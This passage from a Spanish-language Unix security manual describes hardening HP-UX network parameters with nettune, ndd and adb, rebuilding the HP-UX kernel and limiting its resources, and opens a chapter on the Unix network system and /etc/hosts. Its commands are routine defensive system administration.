&#x00A0;arp&#x005F;killcomplete&#x00A0;=&#x00A0;1200&#x00A0;default&#x00A0;=&#x00A0;1200&#x00A0;min&#x00A0;=&#x00A0;60&#x00A0;max&#x00A0;=&#x00A0;3600&#x00A0;units&#x00A0;=&#x00A0;seconds
&#x00A0;arp&#x005F;killincomplete&#x00A0;=&#x00A0;600&#x00A0;default&#x00A0;=&#x00A0;600&#x00A0;min&#x00A0;=&#x00A0;30&#x00A0;max&#x00A0;=&#x00A0;3600&#x00A0;units&#x00A0;=&#x00A0;seconds
&#x00A0;arp&#x005F;unicast&#x00A0;=&#x00A0;300&#x00A0;default&#x00A0;=&#x00A0;300&#x00A0;min&#x00A0;=&#x00A0;60&#x00A0;max&#x00A0;=&#x00A0;3600&#x00A0;units&#x00A0;=&#x00A0;seconds
&#x00A0;arp&#x005F;rebroadcast&#x00A0;=&#x00A0;60&#x00A0;default&#x00A0;=&#x00A0;60&#x00A0;min&#x00A0;=&#x00A0;30&#x00A0;max&#x00A0;=&#x00A0;3600&#x00A0;units&#x00A0;=&#x00A0;seconds
&#x00A0;icmp&#x005F;mask&#x005F;agent&#x00A0;=&#x00A0;0&#x00A0;default&#x00A0;=&#x00A0;0&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;ip&#x005F;check&#x005F;subnet&#x005F;addr&#x00A0;=&#x00A0;1&#x00A0;default&#x00A0;=&#x00A0;1&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;ip&#x005F;defaultttl&#x00A0;=&#x00A0;255&#x00A0;default&#x00A0;=&#x00A0;255&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;255&#x00A0;units&#x00A0;=&#x00A0;hops
&#x00A0;ip&#x005F;forwarding&#x00A0;=&#x00A0;1&#x00A0;default&#x00A0;=&#x00A0;1&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;ip&#x005F;intrqmax&#x00A0;=&#x00A0;50&#x00A0;default&#x00A0;=&#x00A0;50&#x00A0;min&#x00A0;=&#x00A0;10&#x00A0;max&#x00A0;=&#x00A0;1000&#x00A0;units&#x00A0;=&#x00A0;entries
&#x00A0;pmtu&#x005F;defaulttime&#x00A0;=&#x00A0;20&#x00A0;default&#x00A0;=&#x00A0;20&#x00A0;min&#x00A0;=&#x00A0;10&#x00A0;max&#x00A0;=&#x00A0;32768
&#x00A0;tcp&#x005F;localsubnets&#x00A0;=&#x00A0;1&#x00A0;default&#x00A0;=&#x00A0;1&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;tcp&#x005F;receive&#x00A0;=&#x00A0;32768&#x00A0;default&#x00A0;=&#x00A0;32768&#x00A0;min&#x00A0;=&#x00A0;256&#x00A0;max&#x00A0;=&#x00A0;262144&#x00A0;units&#x00A0;=&#x00A0;bytes
&#x00A0;tcp&#x005F;send&#x00A0;=&#x00A0;32768&#x00A0;default&#x00A0;=&#x00A0;32768&#x00A0;min&#x00A0;=&#x00A0;256&#x00A0;max&#x00A0;=&#x00A0;262144&#x00A0;units&#x00A0;=&#x00A0;bytes
&#x00A0;tcp&#x005F;defaultttl&#x00A0;=&#x00A0;64&#x00A0;default&#x00A0;=&#x00A0;64&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;255&#x00A0;units&#x00A0;=&#x00A0;hops
&#x00A0;tcp&#x005F;keepstart&#x00A0;=&#x00A0;7200&#x00A0;default&#x00A0;=&#x00A0;7200&#x00A0;min&#x00A0;=&#x00A0;5&#x00A0;max&#x00A0;=&#x00A0;12000&#x00A0;units&#x00A0;=&#x00A0;seconds
&#x00A0;tcp&#x005F;keepfreq&#x00A0;=&#x00A0;75&#x00A0;default&#x00A0;=&#x00A0;75&#x00A0;min&#x00A0;=&#x00A0;5&#x00A0;max&#x00A0;=&#x00A0;2000&#x00A0;units&#x00A0;=&#x00A0;seconds
&#x00A0;tcp&#x005F;keepstop&#x00A0;=&#x00A0;600&#x00A0;default&#x00A0;=&#x00A0;600&#x00A0;min&#x00A0;=&#x00A0;10&#x00A0;max&#x00A0;=&#x00A0;4000&#x00A0;units&#x00A0;=&#x00A0;seconds
&#x00A0;tcp&#x005F;maxretrans&#x00A0;=&#x00A0;12&#x00A0;default&#x00A0;=&#x00A0;12&#x00A0;min&#x00A0;=&#x00A0;4&#x00A0;max&#x00A0;=&#x00A0;12
&#x00A0;tcp&#x005F;urgent&#x005F;data&#x005F;ptr&#x00A0;=&#x00A0;0&#x00A0;default&#x00A0;=&#x00A0;0&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;udp&#x005F;cksum&#x00A0;=&#x00A0;1&#x00A0;default&#x00A0;=&#x00A0;1&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;udp&#x005F;defaultttl&#x00A0;=&#x00A0;64&#x00A0;default&#x00A0;=&#x00A0;64&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;255&#x00A0;units&#x00A0;=&#x00A0;hops
&#x00A0;udp&#x005F;newbcastenable&#x00A0;=&#x00A0;1&#x00A0;default&#x00A0;=&#x00A0;1&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;udp&#x005F;pmtu&#x00A0;=&#x00A0;0&#x00A0;default&#x00A0;=&#x00A0;0&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;tcp&#x005F;pmtu&#x00A0;=&#x00A0;1&#x00A0;default&#x00A0;=&#x00A0;1&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;tcp&#x005F;random&#x005F;seq&#x00A0;=&#x00A0;0&#x00A0;default&#x00A0;=&#x00A0;0&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;2
&#x00A0;so&#x005F;qlimit&#x005F;max&#x00A0;=&#x00A0;4096&#x00A0;default&#x00A0;=&#x00A0;4096&#x00A0;min&#x00A0;=&#x00A0;1&#x00A0;max&#x00A0;=&#x00A0;8192
&#x00A0;sb&#x005F;max&#x00A0;=&#x00A0;262144&#x00A0;default&#x00A0;=&#x00A0;262144&#x00A0;min&#x00A0;=&#x00A0;10240&#x00A0;max&#x00A0;=&#x00A0;4294967295
&#x00A0;hp&#x005F;syn&#x005F;protect&#x00A0;=&#x00A0;0&#x00A0;default&#x00A0;=&#x00A0;0&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;so&#x005F;qlimit&#x005F;min&#x00A0;=&#x00A0;500&#x00A0;default&#x00A0;=&#x00A0;500&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;8192
&#x00A0;high&#x005F;port&#x005F;enable&#x00A0;=&#x00A0;0&#x00A0;default&#x00A0;=&#x00A0;0&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;high&#x005F;port&#x005F;max&#x00A0;=&#x00A0;65535&#x00A0;default&#x00A0;=&#x00A0;65535&#x00A0;min&#x00A0;=&#x00A0;49153&#x00A0;max&#x00A0;=&#x00A0;65535
&#x00A0;ip&#x005F;forward&#x005F;directed&#x005F;broadcasts&#x00A0;=&#x00A0;1&#x00A0;default&#x00A0;=&#x00A0;1&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;marta:/#
</literallayout>
<!--l. 733--><para>Podemos ver que simplemente por el nombre de estos par&#x00E1;metros el valor de algunos de ellos parece
importante (y lo es) para la seguridad del sistema; este es el caso de ip<informalequation><graphic 
fileref="unixsec245x.gif"></graphic></informalequation>forwarding o tcp<informalequation><graphic 
fileref="unixsec246x.gif"></graphic></informalequation>random<informalequation><graphic 
fileref="unixsec247x.gif"></graphic></informalequation>seq,
por poner unos ejemplos. Podremos modi&#xFB01;car el valor de todos aquellos par&#x00E1;metros que nos interese tambi&#x00E9;n
mediante la orden nettune:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;/usr/contrib/bin/nettune&#x00A0;-l&#x00A0;ip&#x005F;forwarding
&#x00A0;ip&#x005F;forwarding&#x00A0;=&#x00A0;1&#x00A0;default&#x00A0;=&#x00A0;1&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;marta:/#&#x00A0;/usr/contrib/bin/nettune&#x00A0;-s&#x00A0;ip&#x005F;forwarding&#x00A0;0
&#x00A0;marta:/#&#x00A0;/usr/contrib/bin/nettune&#x00A0;-l&#x00A0;ip&#x005F;forwarding
&#x00A0;ip&#x005F;forwarding&#x00A0;=&#x00A0;0&#x00A0;default&#x00A0;=&#x00A0;1&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;marta:/#
</literallayout>
<!--l. 748--><para>Quiz&#x00E1;s son dos los par&#x00E1;metros de los que m&#x00E1;s nos interesa estar pendientes para reforzar nuestra seguridad; el
primero de ellos lo acabamos de ver, y es ip<informalequation><graphic 
fileref="unixsec248x.gif"></graphic></informalequation>forwarding. Como su nombre indica, esta directiva indica si
la m&#x00E1;quina ha de reenviar paquetes (si su valor es 1, el establecido por defecto) o si no ha de hacerlo (valor
0); como ya sabemos, lo m&#x00E1;s probable es que no nos interese este tipo de comportamiento en nuestro
sistema HP-UX, por lo que debemos establecerle un valor &#x2018;0&#x2019; tal y como hemos visto en el ejemplo
anterior.
<!--br/-->
<!--br/-->El segundo par&#x00E1;metro al que debemos estar atentos para incrementar la robustez de un sistema HP-UX es
tcp<informalequation><graphic 
fileref="unixsec249x.gif"></graphic></informalequation>random<informalequation><graphic 
fileref="unixsec250x.gif"></graphic></informalequation>seq, que es equivalente al TCP<informalequation><graphic 
fileref="unixsec251x.gif"></graphic></informalequation>STRONG<informalequation><graphic 
fileref="unixsec252x.gif"></graphic></informalequation>ISS de Solaris: si su valor es 0 (por defecto es as&#x02CA;&#x0131;), la
generaci&#x00F3;n de n&#x00FA;meros iniciales de secuencia TCP es bastante d&#x00E9;bil, si es 1 es algo m&#x00E1;s robusta, y si es 2 (el
valor recomendado) se adapta al esquema de&#xFB01;nido en <citation>[?]</citation>, que como ya sabemos es m&#x00E1;s robusto que los
anteriores.
<!--br/-->
<!--br/-->Aparte de los dos anteriores, existe otro par&#x00E1;metro con&#xFB01;gurable v&#x02CA;&#x0131;a nettune que es interesante para nuestra
seguridad: hp<informalequation><graphic 
fileref="unixsec253x.gif"></graphic></informalequation>syn<informalequation><graphic 
fileref="unixsec254x.gif"></graphic></informalequation>protect, introducido en HP-UX 10.x, y que protege a una m&#x00E1;quina de ataques SYN
Flood si su valor es &#x2018;1&#x2019; (por defecto est&#x00E1; a 0, desactivado), algo con un objetivo similar a las SYN Cookies
del n&#x00FA;cleo de Linux:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;/usr/contrib/bin/nettune&#x00A0;-l&#x00A0;hp&#x005F;syn&#x005F;protect
&#x00A0;hp&#x005F;syn&#x005F;protect&#x00A0;=&#x00A0;0&#x00A0;default&#x00A0;=&#x00A0;0&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;marta:/#&#x00A0;/usr/contrib/bin/nettune&#x00A0;-s&#x00A0;hp&#x005F;syn&#x005F;protect&#x00A0;1
&#x00A0;marta:/#&#x00A0;/usr/contrib/bin/nettune&#x00A0;-l&#x00A0;hp&#x005F;syn&#x005F;protect
&#x00A0;hp&#x005F;syn&#x005F;protect&#x00A0;=&#x00A0;0&#x00A0;default&#x00A0;=&#x00A0;0&#x00A0;min&#x00A0;=&#x00A0;0&#x00A0;max&#x00A0;=&#x00A0;1
&#x00A0;marta:/#
</literallayout>
<!--l. 779--><para>No todos los par&#x00E1;metros importantes para la seguridad del subsistema de red de HP-UX son accesibles a
trav&#x00E9;s de nettune; un buen ejemplo es ip<informalequation><graphic 
fileref="unixsec255x.gif"></graphic></informalequation>block<informalequation><graphic 
fileref="unixsec256x.gif"></graphic></informalequation>source<informalequation><graphic 
fileref="unixsec257x.gif"></graphic></informalequation>routed, que como su nombre indica bloquea las
tramas source routed que llegan a los interfaces de red cuando su valor es verdadero (&#x2018;1&#x2019;), enviando ante la
recepci&#x00F3;n de una de ellas un paquete ICMP de destino inalcanzable hacia el origen de la misma (<citation>[?]</citation>). Otro
ejemplo interesante es lanc<informalequation><graphic 
fileref="unixsec258x.gif"></graphic></informalequation>outbound<informalequation><graphic 
fileref="unixsec259x.gif"></graphic></informalequation>promisc<informalequation><graphic 
fileref="unixsec260x.gif"></graphic></informalequation>flag, que permite a las aplicaciones que utilizan el modo
promiscuo de un interfaz capturar tanto los paquetes inbound (los &#x2018;vistos&#x2019; por el sistema) como los
outbound (los transmitidos por el propio sistema); por defecto el valor de este par&#x00E1;metro es
&#x2018;0&#x2019;, lo que provoca que aplicaciones como tcpdump puedan no funcionar correctamente al ver
s&#x00F3;lo el tr&#x00E1;&#xFB01;co no generado por el propio host. Para asignarle el valor true a ambos par&#x00E1;metros
no podemos utilizar nettune, sino que tenemos que escribir directamente sobre el n&#x00FA;cleo en
ejecuci&#x00F3;n:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;echo&#x00A0;&#x2019;ip&#x005F;block&#x005F;source&#x005F;routed/W1&#x2019;|adb&#x00A0;-w&#x00A0;/stand/vmunix&#x00A0;/dev/kmem
&#x00A0;marta:/#&#x00A0;echo&#x00A0;&#x2019;lanc&#x005F;outbound&#x005F;promisc&#x005F;flag/W1&#x2019;|adb&#x00A0;-w&#x00A0;/stand/vmunix&#x00A0;/dev/kmem
&#x00A0;marta:/#
</literallayout>
<!--l. 801--><para>Como hemos dicho al principio de este punto, en HP-UX 11 se introduce un comando ndd, similar al
que existe en Solaris, que facilita enormemente el ajuste de par&#x00E1;metros de la seguridad del
subsistema de red. Para obtener un listado de cada par&#x00E1;metro con&#xFB01;gurable a trav&#x00E9;s de este interfaz
podemos ejecutar &#x2018;ndd -h&#x2019;, y para hacernos una idea de cuales de estos par&#x00E1;metros son los
m&#x00E1;s importantes para nuestra seguridad una excelente referencia es <citation>[?]</citation>; en cualquier caso, el
nombre de los mismos, as&#x02CA;&#x0131; como la sintaxis de la orden, es muy similar a la que existe en
Solaris.
<!--br/-->
<!--br/-->Como siempre, nos va a interesar deshabilitar diferentes tipos de forwarding en nuestro sistema: el IP
Forwarding, el reenv&#x02CA;&#x0131;o de paquetes con opciones de source routing, y los broadcasts; para conseguirlo
podemos ejecutar &#x2018;ndd -set&#x2019;:

     </para><literallayout role="verbatim">
&#x00A0;marta11:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;forwarding&#x00A0;0
&#x00A0;marta11:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;forward&#x005F;src&#x005F;routed&#x00A0;0
&#x00A0;marta11:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;forward&#x005F;directed&#x005F;broadcasts&#x00A0;0
&#x00A0;marta11:/#
</literallayout>
<!--l. 821--><para>Como ya sabemos, el protocolo ICMP puede ser fuente de diferentes problemas de seguridad en el
sistema, por lo que en ocasiones conviene modi&#xFB01;car algunos de sus par&#x00E1;metros; es importante no
responder a broadcasts de tramas ICMP<informalequation><graphic 
fileref="unixsec261x.gif"></graphic></informalequation>ECHO<informalequation><graphic 
fileref="unixsec262x.gif"></graphic></informalequation>REQUEST, ICMP<informalequation><graphic 
fileref="unixsec263x.gif"></graphic></informalequation>ADDRESS<informalequation><graphic 
fileref="unixsec264x.gif"></graphic></informalequation>MASK<informalequation><graphic 
fileref="unixsec265x.gif"></graphic></informalequation>REQUEST o
ICMP<informalequation><graphic 
fileref="unixsec266x.gif"></graphic></informalequation>TIMESTAMP<informalequation><graphic 
fileref="unixsec267x.gif"></graphic></informalequation>REQUEST, as&#x02CA;&#x0131; como tampoco hacerlo a peticiones ICMP<informalequation><graphic 
fileref="unixsec268x.gif"></graphic></informalequation>TIMESTAMP<informalequation><graphic 
fileref="unixsec269x.gif"></graphic></informalequation>REQUEST
dirigidas directamente a la m&#x00E1;quina (no en broadcast). En este orden, los par&#x00E1;metros del interfaz ndd son los
siguientes:

     </para><literallayout role="verbatim">
&#x00A0;marta11:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;respond&#x005F;to&#x005F;echo&#x005F;broadcast&#x00A0;0
&#x00A0;marta11:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;respond&#x005F;to&#x005F;address&#x005F;mask&#x005F;broadcast&#x00A0;0
&#x00A0;marta11:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;respond&#x005F;to&#x005F;timestamp&#x005F;broadcast&#x00A0;0
&#x00A0;marta11:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;respond&#x005F;to&#x005F;timestamp&#x00A0;0
&#x00A0;marta11:/#
</literallayout>
<!--l. 838--><para>El envio de tramas ICMP<informalequation><graphic 
fileref="unixsec270x.gif"></graphic></informalequation>REDIRECT e ICMP<informalequation><graphic 
fileref="unixsec271x.gif"></graphic></informalequation>SOURCE<informalequation><graphic 
fileref="unixsec272x.gif"></graphic></informalequation>QUENCH se puede evitar tambi&#x00E9;n mediante ndd,
as&#x02CA;&#x0131; como la activaci&#x00F3;n de la defensa contra el SYN &#xFB02;ood que proporciona HP-UX:

     </para><literallayout role="verbatim">
&#x00A0;marta11:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;send&#x005F;redirects&#x00A0;0
&#x00A0;marta11:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;send&#x005F;source&#x005F;quench&#x00A0;0
&#x00A0;marta11:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/tcp&#x00A0;tcp&#x005F;syn&#x005F;rcvd&#x005F;max&#x00A0;500
&#x00A0;marta11:/#
</literallayout>
<!--l. 849--><para>Al igual que suced&#x02CA;&#x0131;a en Solaris (o en AIX con la orden no), los cambios efectuados por ndd tienen efecto
s&#x00F3;lo mientras no se reinicia el sistema, por lo que si queremos hacerlos permanentes hemos
de ejecutarlos autom&#x00E1;ticamente en el arranque de la m&#x00E1;quina. HP-UX ejecuta en uno de sus
scripts de arranque la orden &#x2018;ndd -c&#x2019;, que inicializa los valores por defecto de cada par&#x00E1;metro,
para lo que lee el archivo /etc/rc.config.d/nddconf. En este &#xFB01;chero (de texto), podemos
de&#xFB01;nir las entradas correspondientes a los valores de cada par&#x00E1;metro que nos interesen, de
forma que en cada reinicio del sistema se asignen autom&#x00E1;ticamente; no se trata de un simple
shellscript, sino de un &#xFB01;chero de con&#xFB01;guraci&#x00F3;n con tres entradas por par&#x00E1;metro a con&#xFB01;gurar, que
de&#xFB01;nen el componente sobre el que se aplica (tcp, ip, arp&#x2026;), el nombre del par&#x00E1;metro, y el
valor que queremos darle. Es conveniente, tras modi&#xFB01;car el &#xFB01;chero, que comprobemos que
efectivamente todo ha funcionado como hab&#x02CA;&#x0131;amos de&#xFB01;nido tras un reinicio del sistema (es decir,
que cada uno de los par&#x00E1;metros tiene el valor que nosotros queremos), ya que, como se cita
en <citation>[?]</citation>, existen algunos problemas relacionados con esta forma de trabajar; si no fuera as&#x02CA;&#x0131;,
en la misma obra se explica una sencilla modi&#xFB01;caci&#x00F3;n del sistema que har&#x00E1; que todo funcione
correctamente.
  </para></section><!--end section--><!--l. 868--><section 
role="section"><title><abbrev role="title-mark">12.7</abbrev><anchor 
   id="x1-18400012.7"  ></anchor>El n&#x00FA;cleo de HP-UX</title>
<!--l. 869--><para>  Generalmente se recomienda utilizar la herramienta SAM (System Administration Manager) en los
sistemas HP-UX, que adem&#x00E1;s de las tareas cl&#x00E1;sicas de administraci&#x00F3;n permite modi&#xFB01;car par&#x00E1;metros de un
n&#x00FA;cleo, reconstruirlo e instalarlo en el sistema de una forma sencilla, guardando una copia del kernel actual
en /SYSBACKUP (algo muy &#x00FA;til, ya que recordemos que un n&#x00FA;cleo mal con&#xFB01;gurado puede hacer que la m&#x00E1;quina
no arranque). Por tanto, desde SAM hemos de entrar en el men&#x00FA; &#x2018;Kernel Configuration&#x2019; y desde
ah&#x02CA;&#x0131; elegir los par&#x00E1;metros que deseamos modi&#xFB01;car para construir el nuevo kernel; como en el
caso de Solaris, podemos &#xFB01;jar el par&#x00E1;metro maxusers (tambi&#x00E9;n con un signi&#xFB01;cado similar al que
esta variable posee en Solaris) y tambi&#x00E9;n el n&#x00FA;mero m&#x00E1;ximo de procesos por usuario (par&#x00E1;metro
maxuprc).
<!--br/-->
<!--br/-->Si deseamos modi&#xFB01;car y reconstruir el nuevo n&#x00FA;cleo a mano, el proceso di&#xFB01;ere entre HP-UX 9.x, HP-UX
10.x y HP-UX 11.x. Los pasos en cada caso son los siguientes:
     </para><itemizedlist>
     <listitem>
     <!--l. 885--><para>HP-UX 9.x

         </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;cd&#x00A0;/etc/conf
&#x00A0;#&#x00A0;cp&#x00A0;dfile&#x00A0;dfile.old
&#x00A0;#&#x00A0;vi&#x00A0;dfile
&#x00A0;#&#x00A0;config&#x00A0;dfile
&#x00A0;#&#x00A0;make&#x00A0;-f&#x00A0;config.mk
&#x00A0;#&#x00A0;mv&#x00A0;/hp-ux&#x00A0;/hp-ux.old
&#x00A0;#&#x00A0;mv&#x00A0;/etc/conf/hp-ux&#x00A0;/hp-ux
&#x00A0;#&#x00A0;cd&#x00A0;/&#x00A0;;&#x00A0;shutdown&#x00A0;-ry&#x00A0;0
</literallayout>
     </listitem>
     <listitem>
     <!--l. 898--><para>HP-UX 10.x

         </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;cd&#x00A0;/stand/build
&#x00A0;#&#x00A0;/usr/lbin/sysadm/system&#x005F;prep&#x00A0;-s&#x00A0;system
&#x00A0;#&#x00A0;vi&#x00A0;system
&#x00A0;#&#x00A0;mk&#x005F;kernel&#x00A0;-s&#x00A0;system
&#x00A0;#&#x00A0;mv&#x00A0;/stand/system&#x00A0;/stand/system.prev
&#x00A0;#&#x00A0;mv&#x00A0;/stand/build/system&#x00A0;/stand/system
&#x00A0;#&#x00A0;mv&#x00A0;/stand/vmunix&#x00A0;/stand/vmunix.prev
&#x00A0;#&#x00A0;mv&#x00A0;/stand/build/vmunix&#x005F;test&#x00A0;/stand/vmunix
&#x00A0;#&#x00A0;cd&#x00A0;/&#x00A0;;&#x00A0;shutdown&#x00A0;-ry&#x00A0;0
</literallayout>
     </listitem>
     <listitem>
     <!--l. 912--><para>HP-UX 11.x

         </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;cd&#x00A0;/stand/build
&#x00A0;#&#x00A0;/usr/lbin/sysadm/system&#x005F;prep&#x00A0;-s&#x00A0;system
&#x00A0;#&#x00A0;vi&#x00A0;system
&#x00A0;#&#x00A0;/usr/sbin/mk&#x005F;kernel&#x00A0;-s&#x00A0;/stand/build/system
&#x00A0;#&#x00A0;mv&#x00A0;/stand/system&#x00A0;/stand/system.prev
&#x00A0;#&#x00A0;mv&#x00A0;/stand/vmunix&#x00A0;/stand/vmunix.prev
&#x00A0;#&#x00A0;mv&#x00A0;system&#x00A0;..
&#x00A0;#&#x00A0;/usr/sbin/kmupdate
&#x00A0;#&#x00A0;cd&#x00A0;/&#x00A0;;&#x00A0;shutdown&#x00A0;-ry&#x00A0;0
</literallayout>
     </listitem></itemizedlist>
<!--l. 927--><para>Al editar los &#xFB01;cheros /etc/conf/dfile (HP-UX 9.x) o /stand/build/system (HP-UX 10.x y 11.x) hemos
de especi&#xFB01;car los par&#x00E1;metros comentados anteriormente, de la forma

     </para><literallayout role="verbatim">
&#x00A0;maxuprc&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;60
&#x00A0;maxusers&#x00A0;&#x00A0;&#x00A0;&#x00A0;100
</literallayout>
<!--l. 936--><para>Otros par&#x00E1;metros a tener en cuenta relacionados con la gesti&#x00F3;n de procesos son nproc (n&#x00FA;mero m&#x00E1;ximo de
procesos en el sistema), nkthread (n&#x00FA;mero m&#x00E1;ximo de hilos simult&#x00E1;neos en el n&#x00FA;cleo) o max<informalequation><graphic 
fileref="unixsec273x.gif"></graphic></informalequation>thread<informalequation><graphic 
fileref="unixsec274x.gif"></graphic></informalequation>proc
(n&#x00FA;mero m&#x00E1;ximo de hilos en un proceso).
<!--br/-->
<!--br/-->Igual que en Solaris &#x2013; y en cualquier Unix en general &#x2013; tambi&#x00E9;n nos puede interesar limitar algunos
par&#x00E1;metros relacionados con el sistema de &#xFB01;cheros, de cara a evitar posibles consumos excesivos de recursos
que puedan comprometer nuestra seguridad. Por ejemplo, maxfiles indica un l&#x02CA;&#x0131;mite soft a los &#xFB01;cheros
abiertos por un proceso y maxfiles<informalequation><graphic 
fileref="unixsec275x.gif"></graphic></informalequation>lim un l&#x02CA;&#x0131;mite hard (que obviamente ha de ser mayor que el anterior);
nfile indica el n&#x00FA;mero m&#x00E1;ximo de &#xFB01;cheros abiertos en el sistema y ninode el n&#x00FA;mero de inodos (se
recomienda que ambos coincidan). Por &#x00FA;ltimo, nflocks indica el n&#x00FA;mero m&#x00E1;ximo de &#xFB01;cheros abiertos y
bloqueados en la m&#x00E1;quina.
<!--br/-->
<!--br/-->En el n&#x00FA;cleo de HP-UX 11i se ha introducido un nuevo par&#x00E1;metro que puede resultar muy interesante para
incrementar nuestra seguridad; se trata de executable<informalequation><graphic 
fileref="unixsec276x.gif"></graphic></informalequation>stack, que permite evitar que los
programas ejecuten c&#x00F3;digo de su pila, previniendo as&#x02CA;&#x0131; desbordamientos (<citation>[?]</citation>). Por motivos de
compatibilidad su valor es 1 (esto es, est&#x00E1; habilitado y los programas pueden ejecutar c&#x00F3;digo de
su pila), pero desde SAM podemos cambiar este valor a 0; si lo hacemos as&#x02CA;&#x0131; y un programa
concreto necesita que su pila sea ejecutable, podemos darle ese privilegio mediante la orden
chatr:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;chatr&#x00A0;+es&#x00A0;enable&#x00A0;/usr/local/bin/check
&#x00A0;marta:/#
</literallayout>


<!--l. 1--><para>

</para><!--l. 1--><para>

</para><!--l. 1--><para>

  </para></section><!--end section--><!--l. 1--><section 
role="part"><title><anchor 
   id="x1-185000IV"  ></anchor>Seguridad de la subred</title>

<!--l. 100--><para>


</para><!--l. 1--><para>

  </para></section><!--end part--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-18600013"  ></anchor>El sistema de red</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">13.1</abbrev><anchor 
   id="x1-18700013.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  Por sistema de red de un equipo Unix se entiende el conjunto de software que posibilita la interconexi&#x00F3;n
entre diferentes m&#x00E1;quinas. Este software est&#x00E1; dividido en dos espacios: por un lado, tenemos el soporte de
red dentro del kernel del sistema operativo, encargado de implementar las tareas de m&#x00E1;s bajo nivel
necesarias para la comunicaci&#x00F3;n entre sistemas, como la pila de protocolos TCP/IP o los controladores de
tarjetas de red; por otro, ya en el espacio de usuario, tenemos el conjunto de programas y &#xFB01;cheros
utilizados para con&#xFB01;gurar par&#x00E1;metros del sistema relacionados con la red, como la direcci&#x00F3;n IP, las tablas de
rutado, o el comportamiento de una m&#x00E1;quina ante solicitudes de servicio desde otros equipos conectados
l&#x00F3;gicamente a ella.
<!--br/-->
<!--br/-->En este trabajo vamos a hablar exclusivamente de este software de usuario (tanto utilidades como &#xFB01;cheros)
que de una u otra forma puede afectar a la seguridad global del equipo. Se trata de una peque~na &#x2013; muy
peque~na &#x2013; introducci&#x00F3;n a esta parte del sistema de red en Unix, sin entrar en ning&#x00FA;n detalle; para temas m&#x00E1;s
concretos, como la con&#xFB01;guraci&#x00F3;n del soporte de red en n&#x00FA;cleo, la con&#xFB01;guraci&#x00F3;n de interfaces de red, servicios
de nombres o la con&#xFB01;guraci&#x00F3;n de las tablas de rutado, se puede consultar <citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation> o, en el caso de
m&#x00E1;quinas Linux, <citation>[?]</citation>.
  </para></section><!--end section--><!--l. 23--><section 
role="section"><title><abbrev role="title-mark">13.2</abbrev><anchor 
   id="x1-18800013.2"  ></anchor>Algunos &#xFB01;cheros importantes</title>
<!--l. 24--><para>
  </para><!--l. 24--><section 
role="subsection"><title><abbrev role="title-mark">13.2.1</abbrev><anchor 
   id="x1-18900013.2.1"  ></anchor>El &#xFB01;chero /etc/hosts</title>
<!--l. 25--><para>  Este &#xFB01;chero se utiliza para obtener una relaci&#x00F3;n entre un nombre de m&#x00E1;quina y una direcci&#x00F3;n IP: en cada
l&#x02CA;&#x0131;nea de /etc/hosts se especi&#xFB01;ca una direcci&#x00F3;n IP y los nombres de m&#x00E1;quina que le corresponden, de
forma que un usuario no tenga que recordar direcciones sino nombres de hosts. Habitualmente
se suelen incluir las direcciones, nombres y aliases de todos los equipos conectados a la red
